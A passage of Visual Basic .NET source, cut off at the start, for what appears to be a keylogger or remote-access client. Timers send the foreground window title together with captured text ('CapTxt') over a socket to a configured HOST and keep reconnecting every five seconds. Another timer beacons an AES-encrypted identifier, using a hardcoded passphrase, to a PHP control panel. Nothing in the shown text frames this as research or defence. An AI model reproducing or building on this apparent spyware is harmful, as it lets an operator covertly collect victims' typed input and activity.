                ForeTimer.Stop()
                C.Send(n.activewindow & Sep & CapTxt)
                ' resume timer

                ForeTimer.Start()
            End If
        Else
            ''InfoLabel.Text = "Forewindows timer bad:" & inc
            inc += 1
            C.DisConnect()
        End If
    End Sub

    Private Sub ConTimer_Tick(ByVal sender As System.Object, ByVal e As ElapsedEventArgs)  ''5000
        Me.InfoLabel.Text = "attempt con:" & inc
        inc += 1
        If C.Statconnected = False Then ''attempt connection
            C.Connect(HOST, port)
        End If
    End Sub
    Private Sub ServeTimer_Tick(ByVal sender As System.Object, ByVal e As ElapsedEventArgs) ''connect to lavender web
        trust = False
        Dim response As String
        Try
            ''todo add https
            response = WRequest("http://" & HOST & "/index.php", "0x1", "POST", "id=" & Crypt.AES.Encrypt(name, "hinki", Crypt.AES.salt, "SHA1", 1000, Crypt.AES.IV, 256) & "&iv=" & Crypt.AES.IV)
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
        ''MsgBox(response)
        Me.InfoLabel.Text = response
    End Sub

    ''' <summary>
    ''' Web request poster
    ''' </summary>
    ''' <param name="URL">URL of server</param>
    ''' <param name="useragent">User agent</param>
    ''' <param name="method">Request method</param>
    ''' <param name="POSTdata">Data to post</param>
    ''' <returns></returns>
    Function WRequest(URL As String, useragent As String, method As String, POSTdata As String) As String
        Dim responseData As String = ""
        Try
            Dim cookieJar As New Net.CookieContainer()
            Dim hwrequest As Net.HttpWebRequest = Net.WebRequest.Create(URL)
            hwrequest.CookieContainer = cookieJar
            hwrequest.Accept = "*/*"
            hwrequest.AllowAutoRedirect = True
            hwrequest.UserAgent = useragent ''"http_requester/0.1"
            hwrequest.Timeout = 30000
            hwrequest.Method = method
            If hwrequest.Method = "POST" Then
                hwrequest.ContentType = "application/x-www-form-urlencoded"
                Dim encoding As New System.Text.UTF8Encoding 'Use UTF8Encoding for XML requests
                Dim postByteArray() As Byte = encoding.GetBytes(POSTdata)
                hwrequest.ContentLength = postByteArray.Length
                Dim postStream As IO.Stream = hwrequest.GetRequestStream()
                postStream.Write(postByteArray, 0, postByteArray.Length)
                postStream.Close()
            End If
            Dim hwresponse As Net.HttpWebResponse = hwrequest.GetResponse()
            If hwresponse.StatusCode = Net.HttpStatusCode.OK Then
                Dim responseStream As IO.StreamReader =
                  New IO.StreamReader(hwresponse.GetResponseStream())
                responseData = responseStream.ReadToEnd()
            End If
            hwresponse.Close()
        Catch e As Exception
            responseData = "An error occurred: " & e.Message ''TODO: change to variable sender willl recognize as error
        End Try
        Return responseData
    End Function
End Class
